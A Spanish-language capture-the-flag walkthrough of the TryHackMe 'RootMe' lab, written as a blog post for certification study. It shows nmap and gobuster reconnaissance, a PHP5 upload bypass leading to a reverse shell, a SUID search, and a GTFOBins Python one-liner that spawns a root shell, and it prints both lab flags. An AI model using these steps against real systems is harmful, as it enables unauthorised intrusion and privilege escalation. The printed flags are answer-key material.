---
layout:   post
title: "Write Up RootMe."
subtitle: "Starting-Point"
category: Blog
tags: [Easy,Genin,Linux,THM,GTFOBins,Reconnaissance,PHP,Reverse-Shell,Walkthrough,eWPT,eJPTv2,OSCP]
image:
  path: /assets/img/rootme/rootme.png
---

***
<!--more-->

1. this ordered seed list will be replaced by the toc
{:toc}

***

## Reconnaissance


### nmap

Utizando nmap comprobamos que puertos estan abiertos.


```bash
nmap --open -p- -Pn -n -vvv --min-rate 5000 -sS 10.10.59.240 -oG allports
```


### Services and Versions


```bash
nmap -sCV -p22,80 10.10.59.240 -oN target
```


![list](/assets/img/rootme/Kali-2022-09-19-11-57-40.png){:.lead width="800" height="100" loading="lazy"}


***

## Vulnerability Analysis


### HTTP TCP-80


Investigamos el servicio http que corre en el pueto 80, podemos usar `wapalizzer` para ver que tecnologias usa la pagina asi como desde el terminal `whatweb` al hacer `crtl+ u` no encontramos nada. 


Fuzzeamos la direccion IP para enumerar posibles direcctorios y nos encontramos el directorio `/panel/`y`/uploads/`.


```bash
gobuster dir -u http://10.10.59.240 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 100
```


***

## Exploitation


Podemos tratar de subir archivos pero algunas extenciones estan prohibidas como los son php entre otras de ejecucion solo esan habilitadas las extenciones de imagenes y la de **php5** y es la extension que aprovecharemos, nos montamos un script en php5 para levantarnos una [reverse-shell]


[reverse-shell]: https://www.revshells.com/


![list](/assets/img/rootme/Kali-2022-09-19-12-23-28.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
En panel tenemos un formulario para subir archivos, ponemos a la escucha el lsitener con el puerto a eleccion.


Con acceso a la victima gracias a la shell ya solo debmos buscar la flag de usuario siempres suelen estar en `/Desktop/` pero en este caso se encuentra en `/var/www/` buscarlo manualmente puede ser tedioso asi que lo buscamos con `find` con el siguiente comando.


```bash
find / -name user.txt 2>/dev/null
```


{:.note}
Hacemos un cat a user.txt y vemos la flag `THM{y0u_g0t_a_sh3ll}`.


***

## Privilege escalation


Siempre es bueno ejecutar `LimEnum` Y `pspy` para monitorizar y ver los posibles vectores para escalar de privilegios, ademas hasta que se ejecute los anteriores podemos buscar los permisos con el comado find con el siguite comado.


```bash
find \ -perm -4000 2>/dev/bull
```


{:.note}
Entre otros python tiene permisos de root.


Hay un recurso en internet que es [Gtfobins] que es unrecopilatorio ppara escalar de privileguios a traves de de binarios con permisos.


[Gtfobins]: https://gtfobins.github.io/


```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```


Con lo anterior ya somos root lo siguientes es bucar la root de superusuario de la misma forma que hicimos con el usuario de menos privileguios.


```bash
find / -name root.txt 2>/dev/null
```


{:.note}
Hacemos un cat a root.txt y vemos la flag `THM{pr1v1l3g3_3sc4l4t10n}`.


![list](/assets/img/rootme/Kali-2022-09-19-13-06-27.png){:.lead width="800" height="100" loading="lazy"}


***

```bash
🎉 Felicitaciones ya has comprometido RootMe de Try Hack Me 🎉
```
{:.centered}
***

Back to [Certification eJPTv2](2023-07-03-Road-to-eJPTv2.md){:.heading.flip-title}
{:.read-more}

***

Back to [Certification eWPT](2023-07-04-Road-to-eWPT.md){:.heading.flip-title}
{:.read-more}

***

Back to [Certification OSCP](2023-07-10-Road-to-OSCP.md){:.heading.flip-title}
{:.read-more}
